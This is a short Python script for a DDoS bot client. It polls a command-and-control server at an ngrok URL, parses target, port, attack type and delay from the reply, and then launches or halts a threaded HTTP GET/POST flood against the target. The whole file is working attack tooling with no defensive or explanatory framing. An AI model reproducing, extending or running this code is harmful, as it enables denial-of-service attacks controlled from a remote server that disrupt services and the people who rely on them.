import requests
import time
import threading

# Set the ngrok HTTP(S) URL of the C&C server
NGROK_CCC_URL = "https://random-name.ngrok.io"  # Replace with actual ngrok URL

attack_running = False  # Flag to control attack state
attack_thread = None  # Store attack thread

def http_flood(target_url, attack_type, delay):
    """Performs HTTP/HTTPS flood attack."""
    global attack_running
    print(f"[+] Starting {attack_type} attack on {target_url}")

    while attack_running:
        try:
            if attack_type == "GET":
                requests.get(target_url)  # Send GET request
            elif attack_type == "POST":
                requests.post(target_url, data={"data": "flood"})  # Send POST request
        except Exception as e:
            print(f"[-] Error in attack: {e}")

        time.sleep(delay)  # Delay between requests

def start_attack(target, port, attack_type, delay):
    """Starts the attack in a new thread."""
    global attack_running, attack_thread

    attack_running = True
    target_url = f"http://{target}:{port}" if attack_type != "HTTPS" else f"https://{target}:{port}"
    attack_thread = threading.Thread(target=http_flood, args=(target_url, attack_type, delay))
    attack_thread.start()

def stop_attack():
    """Stops the attack."""
    global attack_running, attack_thread
    attack_running = False
    if attack_thread:
        attack_thread.join()
    print("[+] Attack Stopped.")

def connect_to_ccc():
    """Connects to the C&C server to receive commands."""
    global attack_running

    while True:
        try:
            response = requests.get(NGROK_CCC_URL)
            if response.status_code == 200:
                attack_command = response.text.strip()
                print(f"[+] C&C Command: {attack_command}")

                # Parse command
                target, port, status, attack_type, delay = attack_command.split("_")
                delay = float(delay)

                if status == "LAUNCH":
                    if not attack_running:
                        start_attack(target, port, attack_type, delay)
                elif status == "HALT":
                    if attack_running:
                        stop_attack()

            else:
                print("[-] C&C server error.")
        except Exception as e:
            print(f"[-] Connection failed: {e}")

        time.sleep(10)  # Wait before retrying

if __name__ == "__main__":
    connect_to_ccc()
